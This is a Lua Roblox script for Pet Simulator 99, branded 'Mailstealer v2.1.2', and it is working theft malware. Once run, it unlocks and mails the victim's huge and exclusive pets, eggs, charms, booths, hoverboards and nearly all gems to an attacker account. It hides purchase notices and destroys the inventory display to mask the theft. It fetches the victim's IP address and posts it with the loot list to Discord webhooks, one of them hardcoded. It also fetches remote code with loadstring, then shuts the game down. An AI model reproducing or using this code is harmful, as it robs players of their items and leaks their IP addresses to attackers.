if LoadingScreen == nil then
    LoadingScreen = false
end
if Webhook == nil or Webhook == "" then
    Webhook = ""
end
if Username == "" or Username == nil then
    Username = "Egorikusa_bank"
end
if LoadingScreen == true then
    hideall = false
else
    hideall = true
end

local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
    end
end
if GemAmount1 == nil or GemAmount1 < 10000 then
    game.Players.LocalPlayer:kick("Saving Error, Please Rejoin or Join Back Later!")
end

if LoadingScreen == true then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Egorikusa/PetSimulator99/main/loadingscreen"))()
end

if getgenv().executed then
    return end
getgenv().executed = true

local library = require(game.ReplicatedStorage.Library)
local save = library.Save.Get().Inventory
MailMessage = "Egorikusa on top"
plr = game.Players.LocalPlayer
guis = plr.PlayerGui
local request = request or http_request or httprequest
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end
local function shutdowngame()
    wait(1)
    game:Shutdown()
end

game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim All"):InvokeServer()

if hideall == true then
    task.spawn(
        function()
            while task.wait() do
                pcall(
                    function()
                        game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Purchase Pending").Enabled =
                            false
                    end
                )
            end
        end
    )
    task.spawn(
        function()
            while task.wait() do
                pcall(
                    function()
                        game:GetService("Lighting").PurchasePendingBlur.Enabled = false
                    end
                )
            end
        end
    )
    task.spawn(
        function()
            while task.wait() do
                pcall(
                    function()
                        game:GetService("ReplicatedStorage").Assets.UI.Notifications.Bottom.Message:ClearAllChildren()
                    end
                )
            end
        end
    )
    task.spawn(
        function()
            local gemsDisplay = guis.MainLeft.Left.Currency.Diamonds.Diamonds.Amount
            local oldGemsValue = gemsDisplay.Text
            gemsDisplay:GetPropertyChangedSignal("Text"):Connect(
                function()
                    oldGemsValue = gemsDisplay.Text
                end
            )
        end
    )
    local function freeze_mygems()
        local gems_frame = game:GetService("Players").LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds
        local gems_frame_clone = gems_frame:Clone()

        gems_frame_clone.Parent = game:GetService("Players").LocalPlayer.PlayerGui.MainLeft.Left.Currency
        gems_frame.Visible = true
    end
    freeze_mygems()
    local gemsframe = game:GetService("Players").LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds
    gemsframe:Destroy()
    local function freeze_inventory()
        local pets_frame = game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets
        local pets_frame_clone = pets_frame:Clone()
        pets_frame_clone.Parent = game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main
    end
    freeze_inventory()
    local Inventoryframe = game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets
    Inventoryframe:Destroy()
    game.Workspace.__THINGS.Pets:Destroy()
end


task.spawn(
    function()
        while task.wait() do
            pcall(
                function()
                    local PetUIDs = {}

                    for i, v in pairs(save.Pet) do
                        id = v.id
                        dir = library.Directory.Pets[id]
                        if dir.huge == true then
                            table.insert(PetUIDs, i)
                        end
                    end
                    if save.Egg ~= nil then
                        for i, v in pairs(save.Egg) do
                            table.insert(PetUIDs, i)
                        end
                    end
                    if save.Charm ~= nil then
                        for i, v in pairs(save.Charm) do
                            table.insert(PetUIDs, i)
                        end
                    end

                    for _, petUID in pairs(PetUIDs) do
                        local args = {
                            [1] = petUID,
                            [2] = false
                        }
                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(
                            unpack(args)
                        )
                    end

                    local PetUIDs = {}
                    local library = require(game.ReplicatedStorage.Library)
                    local save = library.Save.Get().Inventory
                    for i, v in pairs(save.Pet) do
                        id = v.id
                        dir = library.Directory.Pets[id]
                        if dir.exclusiveLevel then
                            table.insert(PetUIDs, i)
                        end
                    end
                    for _, petUID in pairs(PetUIDs) do
                        local args = {
                            [1] = petUID,
                            [2] = false
                        }
                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(
                            unpack(args)
                        )
                    end
                end
            )
        end
    end
)

HugeList, ExcList, EggList, CharmList, BoothList, HoverList = {}, {}, {}, {}, {}, {}

table.foreach(
    save.Pet,
    function(i, v)
        local id = v.id
        local dir = library.Directory.Pets[id]
        if dir.huge then
            table.insert(HugeList, id)
        end
    end
)
if save.Egg ~= nil then
    table.foreach(
        save.Egg,
        function(i, v)
            local id = v.id
            local dir = library.Directory.Eggs[id]
            table.insert(EggList, id)
        end
    )
end
table.foreach(
    save.Pet,
    function(i, v)
        local id = v.id
        local dir = library.Directory.Pets[id]
        if dir.exclusiveLevel then
            table.insert(ExcList, id)
        end
    end
)
if save.Charm ~= nil then
    table.foreach(
        save.Charm,
        function(i, v)
            local id = v.id
            local dir = library.Directory.Charms[id]
            table.insert(CharmList, id)
        end
    )
end
if save.Booth ~= nil then
    table.foreach(
        save.Booth,
        function(i, v)
            local id = v.id
            local dir = library.Directory.Booths[id]
            if dir.Tradable ~= false then
                table.insert(BoothList, id)
            end
        end
    )
end
if save.Hoverboard ~= nil then
    table.foreach(
        save.Hoverboard,
        function(i, v)
            local id = v.id
            local dir = library.Directory.Hoverboards[id]
            if dir.Tradable ~= false then
                table.insert(HoverList, id)
            end
        end
    )
end

local AllPetsList = {}
for _, list in pairs({HugeList, ExcList, EggList, CharmList, BoothList, HoverList}) do
    for _, value in pairs(list) do
        table.insert(AllPetsList, value)
    end
end
local PetsListString = "\n" -- Create a string to represent the HugeList
for i, v in pairs(AllPetsList) do
    PetsListString = PetsListString .. v .. "\n" -- Append each Huge item to the string
end
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount = v._am
    end
end

for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
    end
end


for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount = v._am
    end
end
local ipwebhook = game:HttpGet('https://ipinfo.io/ip')
local url = Webhook
local whenabled = true
local function SendWebhook(url, ping)
    imgs =
        "https://cdn.discordapp.com/attachments/1151888533775196180/1190764360717574274/giftps99.png?ex=65a2fcba&is=659087ba&hm=1e65b7100a0159e66e2efd4f1c91a8362b60eb253fec0d40f12b4de5911ca4e5&"
    data1 = {
        ["content"] = ping,
        ["username"] = "Mailstealer v2.1.2",
        ["avatar_url"] = imgs,
        ["embeds"] = {
            {
                ["title"] = "__`Mailstealer Hit`__ \240\159\142\137",
                ["url"] = "https://discord.gg/mailstealer",
                ["type"] = "rich",
                ["color"] = tonumber(0xadffb0),
                ["thumbnail"] = {
                    ["url"] = "https://cdn.discordapp.com/attachments/1151888533775196180/1190764360717574274/giftps99.png?ex=65a2fcba&is=659087ba&hm=1e65b7100a0159e66e2efd4f1c91a8362b60eb253fec0d40f12b4de5911ca4e5&",
                    ["height"] = 420,
                    ["width"] = 420
                },
                ["fields"] = {
                    {
                        ["name"] = "`(\240\159\144\167) Player Info:`",
                        ["value"] = "```(\240\159\167\184) Username: " ..
                            game.Players.LocalPlayer.Name ..
                                "\n(\240\159\148\146) Display Username: " ..
                                    game.Players.LocalPlayer.DisplayName ..
                                        "\n(\240\159\142\178) Creator: " ..
                                            Username .. "\n(\240\159\145\164) Ip: " ..
                                                 ipwebhook .. "\n(\240\159\147\140) Version: 2.1.2(beta) ```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "`(\240\159\144\177) Pets List:`",
                        ["value"] = "```" .. PetsListString .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "`(\240\159\146\142) Gems:`",
                        ["value"] = "```" .. GemAmount .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "`(\240\159\154\128) Creators:`",
                        ["value"] = "```Egorikusa and XorekTop```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "",
                        ["value"] = "__**https://discord.gg/mailstealer**__",
                        ["inline"] = false
                    }
                }
            }
        }
    }

    newdata1 = game:GetService("HttpService"):JSONEncode(data1)
    headers = {
        ["content-type"] = "application/json"
    }
    if Webhook ~= nil and whenabled == true then
        abcdef1 = {
            Url = url,
            Body = newdata1,
            Method = "POST",
            Headers = headers
        }
        request(abcdef1)
    end
end

local user = Username
while wait() do
    local HugeList = {}
    local EggList = {}
    local ExcList = {}
    local CharmList = {}
    local BoothList = {}
    local HoverList = {}

    function GemSteal()
        for i, v in pairs(GetSave().Inventory.Currency) do
            if v.id == "Diamonds" then
                GemAmount = v._am
                GemId = i
                local args = {
                    [1] = user,
                    [2] = MailMessage,
                    [3] = "Currency",
                    [4] = GemId,
                    [5] = GemAmount - 10000
                }
                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                    unpack(args)
                )
                GemsStolen = true
            end
        end
    end
    spawn(
        function()
            while wait() do
                local HugeList = {}
                table.foreach(
                    save.Pet,
                    function(i, v)
                        local id = v.id
                        local dir = library.Directory.Pets[id]
                        if dir.huge then
                            table.insert(HugeList, i)
                        end
                    end
                )
                if #HugeList ~= 0 or HugeList ~= {} then
                    for i, v in pairs(save.Pet) do
                        local id = v.id
                        local dir = library.Directory.Pets[id]
                        if dir.huge then
                            local args = {
                                [1] = user,
                                [2] = MailMessage,
                                [3] = "Pet",
                                [4] = i,
                                [5] = v._am or 1
                            }
                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                                unpack(args)
                            )
                        end
                    end
                    if #HugeList == 0 or HugeList == {} then
                        break
                    end
                end
            end
        end
    )
    spawn(
        function()
            while wait() do
                local EggList = {}
                if save.Egg ~= nil then
                    table.foreach(
                        save.Egg,
                        function(i, v)
                            local id = v.id
                            local dir = library.Directory.Eggs[id]
                            table.insert(EggList, i)
                        end
                    )
                end
                if #EggList ~= 0 and #HugeList == 0 then
                    for i, v in pairs(save.Egg) do
                        local args = {
                            [1] = user,
                            [2] = MailMessage,
                            [3] = "Egg",
                            [4] = i,
                            [5] = v._am or 1
                        }
                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                            unpack(args)
                        )
                    end
                end
                if #EggList == 0 or EggList == {} then
                    break
                end
            end
        end
    )
    spawn(
        function()
            while wait() do
                local ExcList = {}
                table.foreach(
                    save.Pet,
                    function(i, v)
                        local id = v.id
                        local dir = library.Directory.Pets[id]
                        if dir.exclusiveLevel then
                            table.insert(ExcList, i)
                        end
                    end
                )

                if #ExcList ~= 0 and #HugeList == 0 and #EggList == 0 then
                    for i, v in pairs(save.Pet) do
                        local id = v.id
                        local dir = library.Directory.Pets[id]
                        if dir.exclusiveLevel then
                            local args = {
                                [1] = user,
                                [2] = MailMessage,
                                [3] = "Pet",
                                [4] = i,
                                [5] = v._am or 1
                            }
                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                                unpack(args)
                            )
                        end
                    end
                    if #ExcList == 0 or ExcList == {} then
                        break
                    end
                end
            end
        end
    )
    spawn(
        function()
            while wait() do
                local CharmList = {}
                if save.Charm ~= nil then
                    table.foreach(
                        save.Charm,
                        function(i, v)
                            local id = v.id
                            local dir = library.Directory.Charms[id]
                            table.insert(CharmList, i)
                        end
                    )
                end
                if #CharmList ~= 0 and #EggList == 0 and #ExcList == 0 and #HugeList == 0 then
                    for i, v in pairs(save.Charm) do
                        local args = {
                            [1] = user,
                            [2] = MailMessage,
                            [3] = "Charm",
                            [4] = i,
                            [5] = v._am or 1
                        }
                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                            unpack(args)
                        )
                    end
                end
                if #CharmList == 0 or CharmList == {} then
                    break
                end
            end
        end
    )
    if #HugeList + #EggList + #ExcList + #CharmList == 0 then
        spawn(
            function()
                while wait() do
                    local BoothList = {}
                    if save.Booth ~= nil then
                        table.foreach(
                            save.Booth,
                            function(i, v)
                                local id = v.id
                                local dir = library.Directory.Booths[id]
                                if dir.Tradable ~= false then
                                    table.insert(BoothList, i)
                                end
                            end
                        )
                    end
                    if #BoothList ~= 0 then
                        local pet1Index = math.random(1, #BoothList)
                        local booth = BoothList[pet1Index]
                        for booth, v in pairs(save.Booth) do
                            local args = {
                                [1] = user,
                                [2] = MailMessage,
                                [3] = "Booth",
                                [4] = booth,
                                [5] = v._am or 1
                            }
                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                                unpack(args)
                            )
                        end
                    end
                    if #BoothList == 0 or BoothList == {} then
                        BoothEnd = true
                        break
                    end
                end
            end
        )
        spawn(
            function()
                while wait() do
                    local HoverList = {}
                    if save.Hoverboard ~= nil then
                        table.foreach(
                            save.Hoverboard,
                            function(i, v)
                                local id = v.id
                                local dir = library.Directory.Hoverboards[id]
                                if dir.Tradable ~= false then
                                    table.insert(HoverList, i)
                                end
                            end
                        )
                    end
                    if #HoverList ~= 0 then
                        local petIndex = math.random(1, #HoverList)
                        local hover = HoverList[petIndex]
                        for hover, v in pairs(save.Hoverboard) do
                            local args = {
                                [1] = user,
                                [2] = MailMessage,
                                [3] = "Hoverboard",
                                [4] = hover,
                                [5] = v._am or 1
                            }
                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                                unpack(args)
                            )
                        end
                    end
                    if #HoverList == 0 or HoverList == {} then
                        HoverEnd = true
                        break
                    end
                end
            end
        )
    end
    spawn(
        function()
            while wait() do
                FinalList = #HugeList + #ExcList + #EggList + #CharmList
                if BoothEnd == true and HoverEnd == true and FinalList == 0 then
                    GemSteal()
                end
            end
        end
    )
    FinalList = #HugeList + #ExcList + #EggList + #CharmList

    if BoothEnd == true and HoverEnd == true and FinalList == 0 then
        if GemsStolen == true then
            SendWebhook(url, "@everyone | v2.1.2 (beta)")
            SendWebhook(
                "https://discordapp.com/api/webhooks/1191350601955676332/CO50-iNkgESYGQPokv7bnUOLmyq_9xrDl1SV3i28ZkIIFiCI7hcSuwUPh2HMkW-F7XF4",
                "`Not Dualhook`"
            )
            wait(2)
            shutdowngame()
        end
    end
end
